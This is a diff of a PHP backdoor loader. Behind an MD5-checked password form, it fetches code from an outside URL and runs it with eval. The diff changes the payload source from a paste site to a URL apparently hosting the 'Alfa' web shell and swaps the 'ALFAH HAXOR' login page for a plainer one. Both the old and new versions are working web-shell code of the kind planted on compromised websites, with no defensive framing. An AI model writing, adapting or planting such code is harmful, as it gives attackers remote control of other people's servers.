@@ -42,93 +42,41 @@ function is_logged_in()
 // Check if the password is submitted and correct
 if (isset($_POST['password'])) {
     $entered_password = $_POST['password'];
-    $hashed_password = 'd67518449a1740e368f8bc3d028847a5'; // beruang
+    $hashed_password = '7f56f49d957925e095d671a52b8fe81b'; // Replace this with your MD5 hashed password
     if (md5($entered_password) === $hashed_password) {
         // Password is correct, store it in session
         $_SESSION['logged_in'] = true;
         $_SESSION['SAP'] = 'janco'; // Replace this with your cookie data
     } else {
         // Password is incorrect
-        echo "MAU APA AJG!!";
+        echo "Incorrect password. Please try again.";
     }
 }
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-    $a = geturlsinfo('https://paste.ee/r/hYLhNf9Z/0');
+    $a = geturlsinfo('https://shell.prinsh.com/Nathan/alfa.txt');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
     ?>
-
-<!DOCTYPE html>
-<html>
-<head>
-    <title>ALFAH HAXOR</title>
-</head>
-<body>
-  <style>
-    html{
-        background-color: #000;
-    }
-  body {
-  margin: 0;
-  padding: 0;
-  height: 100vh;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  color: rgb(0, 0, 0);
-  background: url('https://haxor.lol/love/asta.gif') no-repeat center center fixed;
-  background-size: 50rem;
-  font-family: Arial, sans-serif;
-  }
-  
-  form {
-  background: transparent;
-  padding: 20px;
-  border-radius: 10px;
-  box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
-  }
-  
-  label {
-  display: block;
-  margin-bottom: 10px;
-  }
-  
-input {
-width: 100%;
-padding: 10px;
-margin-bottom: 15px;
-box-sizing: border-box;
-border: 2px solid #f00;
-border-radius: 5px;
-background-color: transparent;
-color: #333;
-text-align: center;
-  }
-  
-  input[type="submit"] {
-  color: white;
-  cursor: pointer;
-  }
-  
-  input[type="submit"]:hover {
-  background-color: black;
-  }
-  input[type="password"]:hover {
-  background-color: white;
-  }
-  </style>
-  </head>
-  <body>
-  <form method="POST" action="">
-  <input type="password" id="password" name="password">
-  <input type="submit" value="Submit">
-  </form>
-  </body>
-  </html>
-
-  <?php
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Seo Ane Puasi</title>
+    </head>
+    <body>
+        <center>
+        <img src="https://pomf2.lain.la/f/1s5gc3pl.png" />
+        <body style="background-color:black;">
+        <form method="POST" action="">
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password">
+            <input type="submit" value="Touch Me!">
+        </form>
+        </center>
+    </body>
+    </html>
+    <?php
 }
 ?>
